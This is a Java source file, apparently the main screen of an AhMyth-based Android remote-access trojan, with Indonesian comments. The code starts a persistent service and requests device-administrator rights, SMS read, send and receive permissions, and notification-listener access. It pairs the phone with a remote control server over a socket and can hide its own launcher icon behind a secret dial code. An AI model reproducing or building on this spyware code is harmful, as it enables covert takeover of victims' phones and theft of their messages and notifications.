package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import io.socket.emitter.Emitter;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";

    DevicePolicyManager devicePolicyManager;
    ComponentName componentName;
    SharedPreferences sharedPreferences;

    private Button btnPairing;
    private Button btnListener;
    private Button btnGooglePlay;
    private EditText inputPairingCode;
    private Switch hide_icon_switch;

    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            Log.d(TAG, "MainActivity onCreate started");

            // Start service terlebih dahulu
            MainService.startService(this);

            setContentView(R.layout.activity_main);

            // Initialize views with null checks
            btnPairing = findViewById(R.id.pairingBtn);
            btnListener = findViewById(R.id.listenerBtn);
            btnGooglePlay = findViewById(R.id.btnGooglePlay);
            inputPairingCode = findViewById(R.id.pairingCode);
            hide_icon_switch = findViewById(R.id.switch1);

            if (btnPairing == null || btnListener == null || inputPairingCode == null) {
                Log.e(TAG, "Views not found!");
                Toast.makeText(this, "Error loading UI", Toast.LENGTH_SHORT).show();
                return;
            }

            componentName = new ComponentName(this, AdminReceiver.class);
            devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);

            // ========================================
            // AUTO UPPERCASE INPUT
            // ========================================
            inputPairingCode.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

                @Override
                public void onTextChanged(CharSequence s, int start, int before, int count) {}

                @Override
                public void afterTextChanged(Editable s) {
                    try {
                        String input = s.toString();
                        if (!input.equals(input.toUpperCase())) {
                            inputPairingCode.removeTextChangedListener(this);
                            inputPairingCode.setText(input.toUpperCase());
                            inputPairingCode.setSelection(inputPairingCode.getText().length());
                            inputPairingCode.addTextChangedListener(this);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error in text watcher: " + e.getMessage());
                    }
                }
            });

            // ========================================
            // SETUP NOTIFICATION LISTENER BUTTON
            // ========================================
            try {
                if (!NotificationManager.isNotificationServiceEnabled(this)) {
                    btnListener.setText("ENABLE");
                } else {
                    btnListener.setText("ENABLED ✓");
                    btnListener.setEnabled(false);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error checking notification: " + e.getMessage());
            }

            btnListener.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    try {
                        Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                        startActivity(intent);
                    } catch (Exception e) {
                        Toast.makeText(MainActivity.this, "Cannot open settings", Toast.LENGTH_SHORT).show();
                    }
                }
            });

            // ========================================
            // SETUP DEVICE ADMIN
            // ========================================
            try {
                if (!devicePolicyManager.isAdminActive(componentName)) {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
                    startActivity(intent);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error setting up device admin: " + e.getMessage());
            }

            // ========================================
            // CHECK PERMISSIONS
            // ========================================
            try {
                if (
                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                                ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                                ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED
                ) {
                    Intent mIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    mIntent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(mIntent);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error checking permissions: " + e.getMessage());
            }

            // ========================================
            // START FOREGROUND SERVICE
            // ========================================
            try {
                Intent serviceIntent = new Intent(this, MainService.class);
                ContextCompat.startForegroundService(this, serviceIntent);
            } catch (Exception e) {
                Log.e(TAG, "Error starting service: " + e.getMessage());
            }

            // ========================================
            // PAIRING BUTTON HANDLER (dengan delay untuk socket ready)
            // ========================================
            btnPairing.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    String pairingCode = inputPairingCode.getText().toString().trim().toUpperCase();

                    if (pairingCode.isEmpty()) {
                        Toast.makeText(MainActivity.this, "⚠️ Masukkan kode pairing!", Toast.LENGTH_SHORT).show();
                        inputPairingCode.requestFocus();
                        return;
                    }

                    if (pairingCode.length() != 8) {
                        Toast.makeText(MainActivity.this, "⚠️ Kode harus 8 karakter!", Toast.LENGTH_SHORT).show();
                        inputPairingCode.requestFocus();
                        return;
                    }

                    // Check socket dengan try-catch
                    try {
                        if (IOSocket.getInstance() == null || IOSocket.getInstance().getIoSocket() == null) {
                            Toast.makeText(MainActivity.this, "❌ Socket belum siap!\nTunggu beberapa saat...", Toast.LENGTH_LONG).show();
                            return;
                        }

                        if (!IOSocket.getInstance().getIoSocket().connected()) {
                            Toast.makeText(MainActivity.this, "❌ Belum terhubung ke server!\nTunggu beberapa saat...", Toast.LENGTH_LONG).show();
                            return;
                        }

                        // Kirim pairing code
                        JSONObject pairData = new JSONObject();
                        pairData.put("pairing_code", pairingCode);

                        IOSocket.getInstance().getIoSocket().emit("pair_device", pairData);

                        Toast.makeText(MainActivity.this, "📡 Mengirim kode pairing...", Toast.LENGTH_SHORT).show();

                        btnPairing.setEnabled(false);
                        btnPairing.setText("LOADING...");
                        inputPairingCode.setEnabled(false);

                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                if (btnPairing != null && !btnPairing.getText().toString().contains("✓")) {
                                    btnPairing.setEnabled(true);
                                    btnPairing.setText("PAIR DEVICE");
                                    if (inputPairingCode != null) {
                                        inputPairingCode.setEnabled(true);
                                    }
                                }
                            }
                        }, 10000);

                    } catch (Exception e) {
                        Log.e(TAG, "Error pairing: " + e.getMessage());
                        e.printStackTrace();
                        Toast.makeText(MainActivity.this, "❌ Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        btnPairing.setEnabled(true);
                        btnPairing.setText("PAIR DEVICE");
                        inputPairingCode.setEnabled(true);
                    }
                }
            });

            // ========================================
            // SETUP PAIRING LISTENER (dengan delay)
            // ========================================
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    setupPairingListener();
                }
            }, 2000); // Tunggu 2 detik untuk socket ready

            // ========================================
            // HIDE ICON SWITCH
            // ========================================
            if (hide_icon_switch != null) {
                if (android.os.Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                    hide_icon_switch.setVisibility(View.VISIBLE);

                    sharedPreferences = getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
                    final SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();

                    hide_icon_switch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
                        @Override
                        public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                            appSettingEditor.putBoolean("hidden_status", isChecked);
                            appSettingEditor.commit();

                            if (isChecked) {
                                Toast.makeText(MainActivity.this, "⚠️ Icon akan disembunyikan.\nDial *55555# untuk menampilkan.", Toast.LENGTH_LONG).show();
                                fn_hideicon();
                            }
                        }
                    });

                    boolean icon_hidden_status = sharedPreferences.getBoolean("hidden_status", false);
                    hide_icon_switch.setChecked(icon_hidden_status);

                } else {
                    hide_icon_switch.setVisibility(View.GONE);
                }
            }

            // ========================================
            // CHECK PAIRED STATUS
            // ========================================
            checkPairedStatus();

            Log.d(TAG, "MainActivity onCreate completed");

        } catch (Exception e) {
            Log.e(TAG, "Fatal error in onCreate: " + e.getMessage());
            e.printStackTrace();
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    private void setupPairingListener() {
        try {
            if (IOSocket.getInstance() == null || IOSocket.getInstance().getIoSocket() == null) {
                Log.e(TAG, "Socket not ready for listener");
                return;
            }

            IOSocket.getInstance().getIoSocket().on("pair_result", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject result = (JSONObject) args[0];
                        final boolean success = result.getBoolean("success");
                        final String message = result.getString("message");

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                if (success) {
                                    Toast.makeText(MainActivity.this, "✅ " + message, Toast.LENGTH_LONG).show();

                                    SharedPreferences prefs = getSharedPreferences("AppSettings", MODE_PRIVATE);
                                    prefs.edit().putBoolean("is_paired", true).apply();

                                    if (inputPairingCode != null) {
                                        inputPairingCode.setText("");
                                    }

                                    updateUIForPairedDevice();

                                } else {
                                    Toast.makeText(MainActivity.this, "❌ " + message, Toast.LENGTH_LONG).show();

                                    if (btnPairing != null) {
                                        btnPairing.setEnabled(true);
                                        btnPairing.setText("PAIR DEVICE");
                                    }
                                    if (inputPairingCode != null) {
                                        inputPairingCode.setEnabled(true);
                                    }
                                }
                            }
                        });
                    } catch (Exception e) {
                        Log.e(TAG, "Error in pair result: " + e.getMessage());
                    }
                }
            });

            Log.d(TAG, "Pairing listener setup complete");
        } catch (Exception e) {
            Log.e(TAG, "Error setting up pairing listener: " + e.getMessage());
        }
    }

    private void checkPairedStatus() {
        try {
            SharedPreferences prefs = getSharedPreferences("AppSettings", MODE_PRIVATE);
            boolean isPaired = prefs.getBoolean("is_paired", false);

            if (isPaired) {
                updateUIForPairedDevice();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking paired status: " + e.getMessage());
        }
    }

    private void updateUIForPairedDevice() {
        try {
            if (btnPairing != null) {
                btnPairing.setText("✓ DEVICE PAIRED");
                btnPairing.setEnabled(false);
            }
            if (inputPairingCode != null) {
                inputPairingCode.setEnabled(false);
                inputPairingCode.setHint("Device already paired");
                inputPairingCode.setText("");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error updating UI: " + e.getMessage());
        }
    }

    public void fn_hideicon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                    getComponentName(),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            Log.e(TAG, "Error hiding icon: " + e.getMessage());
        }
    }

    public void openGooglePlay(View view) {
        try {
            Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
            startActivity(GoogleIntent);
        } catch (Exception e) {
            Toast.makeText(this, "Cannot open Google Play", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        try {
            if (btnListener != null && NotificationManager.isNotificationServiceEnabled(this)) {
                btnListener.setText("ENABLED ✓");
                btnListener.setEnabled(false);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onResume: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        try {
            if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                IOSocket.getInstance().getIoSocket().off("pair_result");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onDestroy: " + e.getMessage());
        }
    }
}
